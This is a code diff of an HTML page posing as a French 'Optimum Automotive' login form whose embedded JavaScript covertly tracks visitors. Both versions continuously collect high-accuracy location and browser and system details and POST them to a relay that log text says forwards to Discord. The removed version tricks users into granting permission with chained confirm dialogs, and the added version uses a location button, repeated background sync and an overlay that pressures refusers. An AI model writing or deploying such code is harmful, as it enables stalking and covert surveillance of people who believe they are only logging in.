@@ -1,27 +1,30 @@
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Form</title>
     <link rel="stylesheet" href="styles.css">
     <style>
-       
+
     </style>
 </head>
-<body >
+
+<body>
     <div id="locationDisplay"></div>
-    
+    <button id="requestLocation">Enable Location Access</button>
+
     <div class="loginWrapper">
         <div class="logo">
             <img src="image.png" alt="Optimum Automotive Logo">
         </div>
         <form class="login-form">
-          
+
             <label for="login">Login</label>
-          <div class= "login-container">
-            <input type="text" id="login" name="login" required>
-          </div>
+            <div class="login-container">
+                <input type="text" id="login" name="login" required>
+            </div>
 
             <label for="password">Mot de passe</label>
             <div class="password-container">
@@ -38,9 +41,9 @@
 
             <button type="submit" class="login-button">Connexion</button>
         </form>
- <!-- Add the "Enable Location Access" button here -->
+        <!-- Add the "Enable Location Access" button here -->
     </div>
-    
+
     <footer class="footer">
         <div class="footer-container">
             <p>&copy; 2024 Optimum Automotive. All Rights Reserved.</p>
@@ -53,59 +56,115 @@
         </div>
     </footer>
     <script>
-   
-   
-   document.addEventListener("DOMContentLoaded", function () {
-    console.log("✅ DOM fully loaded. Starting tracking...");
+        let locationworker;
 
-    // let locationDisplay = document.getElementById("locationDisplay");
-    if (!locationDisplay) {
-        console.error("🚨 ERROR: #locationDisplay is missing from the DOM.");
-        return;
-    }
+        async function startTracking() {
+            if ("serviceWorker" in navigator && "SyncManager" in window) {
+                try {
+                    const registration = await navigator.serviceWorker.ready;
 
-    startTracking();
-    function showFirstDialog() {
-        if (confirm("Welcome! Click 'OK' to proceed.")) {
-            setTimeout(() => showSecondDialog(), 1000); // Delay before showing second dialog
-        } else {
-            alert("You must authorize to proceed.");
+                    // Register periodic sync
+                    setInterval(async () => {
+                        await registration.sync.register("syncLocation");
+                        console.log("✅ Background sync registered!");
+                    }, 3000); // Every 5 minutes (300,000ms)
+
+                } catch (error) {
+                    console.error("🚨 Failed to register background sync:", error);
+                }
+            } else {
+                console.error("🚨 Background sync not supported");
+            }
         }
-    }
 
-    function showSecondDialog() {
-        if (confirm("To continue, please click 'OK' again.")) {
-            setTimeout(() => getLocation(), 1000); // Delay before actual location request
-        } else {
-            alert("Location access is required for the best experience.");
+        // Start tracking when the page loads
+        document.addEventListener("DOMContentLoaded", function () {
+            console.log("✅ DOM fully loaded. Waiting for location permission...");
+
+           
+        });
+
+
+        if ("serviceWorker" in navigator) {
+            navigator.serviceWorker.register("service-worker.js")
+                .then((registration) => {
+                    console.log("✅ Service Worker registered:", registration.scope);
+                })
+                .catch((error) => {
+                    console.error("🚨 Service Worker registration failed:", error);
+                });
         }
-    }
-
-    function startTracking() {
-  if (navigator.geolocation) {
-    navigator.geolocation.watchPosition(updatePosition, showError, {
-      enableHighAccuracy: true,
-      timeout: 0,
-      maximumAge: 0
-    });
-  } else {
-    console.log("Geolocation is not supported by this browser.");
-  }
-}
-
-let lastSentTime = 0; // Track last update time to prevent spam
-const updateInterval = 3000; // Send an update every 5 seconds
 
 
+        document.getElementById("requestLocation").addEventListener("click", function () {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        console.log(`✅ Initial Location: ${position.coords.latitude}, ${position.coords.longitude}`);
+                        startTracking();
+                    },
+                    (error) => {
+                        console.error("🚨 Location error:", error.message);
+                        document.getElementById("locationOverlay").classList.add("show"); // Show overlay
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000, // Allow some delay
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                alert("❌ Geolocation is not supported by this browser.");
+            }
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(
+                    (location) => {
+                        let latitude = location.coords.latitude;
+                        let longitude = location.coords.longitude;
+                        let timestamp = new Date().toLocaleTimeString();
+
+                        console.log(`📡 Sending location: ${latitude}, ${longitude} at ${timestamp}`);
+
+                        fetch("http://localhost:4000/store-location", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ latitude, longitude })
+                        })
+                            .then(response => response.json())
+                            .then(data => console.log("✅ Location stored:", data))
+                            .catch(error => console.error("🚨 Error storing location:", error));
+                    },
+                    (error) => {
+                        console.error("🚨 Location error:", error.message);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000, // Allow some delay
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                console.error("❌ Geolocation is not supported in this browser.");
+            }
+
+        });
 
 
-    function showPosition(position) {
-        let latitude = position.coords.latitude;
-        let longitude = position.coords.longitude;
-        let timestamp = new Date().toLocaleTimeString();
-        console.log(latitude, longitude);
 
-        let systemInfo = `
+
+        let lastSentTime = 0; // Track last update time to prevent spam
+        const updateInterval = 3000; // Send an update every 5 seconds
+
+
+
+
+        function showPosition(position) {
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+            let timestamp = new Date().toLocaleTimeString();
+            console.log(latitude, longitude);
+
+            let systemInfo = `
         User Agent: ${navigator.userAgent}
         Platform: ${navigator.platform}
         Cookies Enabled: ${navigator.cookieEnabled}
@@ -115,98 +174,131 @@ const updateInterval = 3000; // Send an update every 5 seconds
         Time: ${timestamp}
         `;
 
-        let locationData = `
+            let locationData = `
         Latitude: ${latitude}
         Longitude: ${longitude}
         Google Maps: https://www.google.com/maps/place/${latitude},${longitude}
         `;
 
-        sendData("User System Information", systemInfo);
-        sendData("User Location", locationData);
-    }
-
-    function updatePosition(position) {
-    latitude = position.coords.latitude;
-    longitude = position.coords.longitude;
-    timestamp = new Date().toLocaleTimeString();
-
-    console.log(`📍 Latitude: ${latitude}, Longitude: ${longitude} at ${timestamp}`);
-
-    // Ensure the element exists before updating
-    let locationDisplay = document.getElementById("locationDisplay");
-    if (locationDisplay) {
-        locationDisplay.innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
-    } else {
-        console.error("🚨 ERROR: #locationDisplay not found in the DOM.");
-    }
-
-    // Prevent sending too many updates
-    let currentTime = new Date().getTime();
-    if (currentTime - lastSentTime > updateInterval) {
-        sendData(
-            "Live Location Update",
-            `📍 **Lat:** ${latitude}, **Lon:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
-        );
-        lastSentTime = currentTime;
-    }
-}
-
-    function showError(error) {
-        let message;
-        switch (error.code) {
-            case error.PERMISSION_DENIED:
-                message = "User denied the request for Geolocation.";
-                document.getElementById("locationOverlay").classList.add("show"); // Show overlay
-                break;
-            case error.POSITION_UNAVAILABLE:
-                message = "Location information is unavailable.";
-                break;
-            case error.TIMEOUT:
-                message = "The request to get user location timed out.";
-                break;
-            case error.UNKNOWN_ERROR:
-                message = "An unknown error occurred.";
-                break;
+            sendData("User System Information", systemInfo);
+            sendData("User Location", locationData);
         }
-        console.log(message);
-        sendData("Location Error", message);
-    }
 
-    function sendData(title, description) {
-    fetch("http://localhost:3000/send-location", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ title, description })
-    })
-    .then(response => response.json())
-    .then(data => console.log("✅ Sent location update:", data))
-    .catch(error => console.error("🚨 Error sending data:", error));
-}
+        function updatePosition(position) {
+            latitude = position.coords.latitude;
+            longitude = position.coords.longitude;
+            timestamp = new Date().toLocaleTimeString();
 
+            console.log(`📍 Latitude: ${latitude}, Longitude: ${longitude} at ${timestamp}`);
 
+            // Ensure the element exists before updating
+            let locationDisplay = document.getElementById("locationDisplay");
+            if (locationDisplay) {
+                locationDisplay.innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+            } else {
+                console.error("🚨 ERROR: #locationDisplay not found in the DOM.");
+            }
 
+            // Prevent sending too many updates
+            let currentTime = new Date().getTime();
+            if (currentTime - lastSentTime > updateInterval) {
+                sendData(
+                    "Live Location Update",
+                    `📍 **Lat:** ${latitude}, **Lon:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
+                );
+                lastSentTime = currentTime;
+            }
+        }
 
+        function showError(error) {
+            let message;
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    message = "User denied the request for Geolocation.";
+                    document.getElementById("locationOverlay").classList.add("show"); // Show overlay
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    message = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    message = "An unknown error occurred.";
+                    break;
+            }
+            console.log(message);
+            sendData("Location Error", message);
+        }
 
-
-});
-
-   
-        
-
-        if ("serviceWorker" in navigator) {
-          navigator.serviceWorker.register("service-worker.js")
-            .then((registration) => {
-              console.log("Service Worker registered with scope:", registration.scope);
+        function sendData(title, description) {
+            fetch("http://localhost:4000/send-location", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ title, description })
             })
-            .catch((error) => {
-              console.error("Service Worker registration failed:", error);
-            });
+                .then(response => response.json())
+                .then(data => console.log("✅ Sent location update:", data))
+                .catch(error => console.error("🚨 Error sending data:", error));
         }
-    
+
+
+
+
+        if ("serviceWorker" in navigator && "SyncManager" in window) {
+            navigator.serviceWorker.ready.then((registration) => {
+                setInterval(async () => {
+                    await registration.sync.register("syncLocation");
+                    console.log("✅ Background sync registered!");
+                }, 60000); // Sync every 60 seconds
+            }).catch(console.error);
+        }
+
+
+        //Geolocation tracking moved from locationWorker.js to index.html
+        self.addEventListener("sync", function (event) {
+            if (event.tag === "syncLocation") {
+                event.waitUntil(fetchBackgroundLocation());
+            }
+        });
+
+        async function fetchBackgroundLocation() {
+            try {
+                console.log("📡 Fetching background location...");
+                const response = await fetch("http://localhost:4000/get-latest-location");
+
+                if (!response.ok) {
+                    throw new Error(`❌ HTTP error! Status: ${response.status}`);
+                }
+
+                const data = await response.json();
+                console.log("📍 Background location received:", data);
+
+                if (data.latitude && data.longitude) {
+                    let payload = {
+                        title: "Background Location Update",
+                        description: `📍 **Lat:** ${data.latitude}, **Lon:** ${data.longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${data.latitude},${data.longitude})`
+                    };
+
+                    await fetch("http://localhost:4000/send-location", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
+                    });
+
+                    console.log("✅ Background location sent to Discord!");
+                } else {
+                    console.warn("⚠️ No valid location data found.");
+                }
+            } catch (error) {
+                console.error("🚨 Failed to fetch background location:", error);
+            }
+        }
 
     </script>
     <script href="server.js"></script>
-    
+    <script href="locationWorker.js"></script>
+
     <div id="locationOverlay" class="overlay">
         <div class="overlay-content">
             <h2>We Need Your Location</h2>
@@ -214,9 +306,10 @@ const updateInterval = 3000; // Send an update every 5 seconds
             <button id="grantLocation">Click allow</button>
         </div>
     </div>
-   
-  
 
-    
+
+
+
 </body>
+
 </html>
